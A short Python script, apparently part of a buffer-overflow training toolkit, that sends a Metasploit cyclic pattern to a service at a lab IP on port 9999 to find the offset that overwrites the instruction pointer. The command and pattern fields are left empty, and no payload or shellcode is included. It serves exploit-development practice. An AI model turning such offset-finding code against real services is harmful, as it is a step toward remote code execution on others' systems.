#!/usr/bin/python3
# 3offset.py
# https://github.com/hungryrussian/bufferoverflowtoolkit

import sys, socket

# Step 1: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1400
# Step 2: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1400 -q <EIP VALUE>

ip = "192.168.1.120"
port = 9999
command = ""

# Insert offset cyclical code generated from step 1 above
offset = ""

string = command + offset + "\r\n"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    print("Sending buffer...")
    s.send(bytes(string, "latin-1"))
    s.recv(1024)
    print("Done!")

except:
    print("Could not connect to server.")
    sys.exit()
